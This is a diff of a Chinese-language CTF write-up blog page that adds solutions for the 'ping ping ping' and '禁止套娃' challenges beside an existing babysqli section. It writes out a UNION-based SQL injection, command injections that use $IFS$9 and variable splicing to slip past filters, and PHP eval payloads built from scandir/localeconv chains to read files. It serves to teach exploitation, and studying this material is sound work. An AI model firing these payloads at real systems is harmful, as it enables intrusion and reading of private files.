@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2019-12-25</span>
-            <span class="time">00:38:51</span>
+            <span class="time">21:07:06</span>
           </span>
           
           <!--  Categories  -->
@@ -153,12 +153,14 @@
 <span class="hljs-meta">?&gt;</span></span></code></pre>
 
 <p>大致的意思就是我们我们传入的会通过md5加密，和数据库的md5比较，如果成功就得到flag.但我们并不知道数据库中的md5所以只能我们自己构造值传到php<br>构造如下语句<br><code>name=ad&#39;union select &#39;1&#39;,&#39;admin&#39;,&#39;3f898d258f71099c3164a570cc27bd8d&#39;&amp;pw=disshu</code><br>首先找到个注入点，这个不多说。但是我们怎么知道回显的列数是三个呢，这里是用sqlmap实现的，得到3列<br><img src="https://img-blog.csdnimg.cn/20191226090329744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="babysqli 1"></p>
-<h1 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h1><p>首先我们输入127.0.0.1;ls会发现里面的有flag.php index.php<br><img src="https://img-blog.csdnimg.cn/20191226092319490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="index"><br>下面介绍两种方法,首先用$IFS$9的方式过滤空格，这个过滤方法百试不厌，;cat$IFS$9index.php<br><img src="https://img-blog.csdnimg.cn/20191226092305995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="index.php"><br>发现正则匹配用的(.*)所以我们可以对flag绕过</p>
-<pre><code class="hljs ;b">![flag](https://img-blog.csdnimg.cn/20191226092328409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70)
-第二种是v&amp;n的师傅的思路，直接</code></pre>
+<h1 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h1><p>首先我们输入127.0.0.1;ls会发现里面的有flag.php index.php<br><img src="https://img-blog.csdnimg.cn/20191226092319490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="index"><br>下面介绍两种方法,首先用$IFS$9的方式过滤空格，这个过滤方法百试不厌，;cat$IFS$9index.php<br><img src="https://img-blog.csdnimg.cn/20191226092305995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="index.php"><br>发现正则匹配用的(.)所以我们可以对flag绕过<br><code>;b=g;cat$IFS$9fla$b.php</code><br><img src="https://img-blog.csdnimg.cn/20191226092328409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="flag"><br>第二种是v&amp;n的师傅的思路，直接</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>`<span class="hljs-keyword">ls</span>`</code></pre>
 
-<p>cat$IFS$9<code>ls</code></p>
-<pre><code></code></pre>
+<h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h1><p>这道题跟之前有一个比赛很像，好像是字节跳动的题，但是这道题需要有百度域名所以就没做。<br>首先拿到题目我们扫一遍目录.<br><img src="https://img-blog.csdnimg.cn/20200113100413558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有git源码泄露，把它downloads下来</p>
+<pre><code class="hljs undefined">"; if(isset($_GET['exp']))&#123; if (!preg_match('/data:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>|filter:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>|php:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>|phar:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>/i', $_GET['exp'])) &#123; if(';' === preg_replace('/[a-z|<span class="hljs-symbol">\-</span>]+<span class="hljs-symbol">\(</span>(?R)?<span class="hljs-symbol">\)</span>/', NULL, $_GET['exp'])) &#123; if (!preg_match('/et|na|nt|info|dec|bin|hex|oct|pi|log/i', <span class="hljs-keyword">$code)) &#123; // echo $_GET['exp']; eval</span>($_GET['exp']); &#125; else&#123; die("还差一点哦！"); &#125; &#125; else&#123; die("再好好想想！"); &#125; &#125; else&#123; die("还想读flag，臭弟弟！"); &#125; &#125; // highlight_file(__FILE__); ?&gt;</code></pre>
+
+<p>首先这道题过掉了所有的协议，这很给力。<br>重点看这个正则匹配(?R)说明我们只能用小括号匹配<br>我们重点首先访问当前目录<br><code>print_r(scandir(&#39;.&#39;));</code><br>但是这个.我们被匹配掉了<br>所以只能构造函数了<br><code>?exp=print_r(scandir(current(localeconv())));</code><br><img src="https://img-blog.csdnimg.cn/20200113100451692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现得到其中的文件，php有两个函数<br>array_flip,php官方文档是这么解释的<br><code>array_flip() 函数用于反转/交换数组中的键名和对应关联的键值。</code><br>重点是下一个函数<br><code>array_rand()函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</code><br>所以我们就可以构造如下payloads<br><code>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code><br>这题看运气，随机到flag…..<br><img src="https://img-blog.csdnimg.cn/20200113100506217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
         </div>
       </div>
     </div>
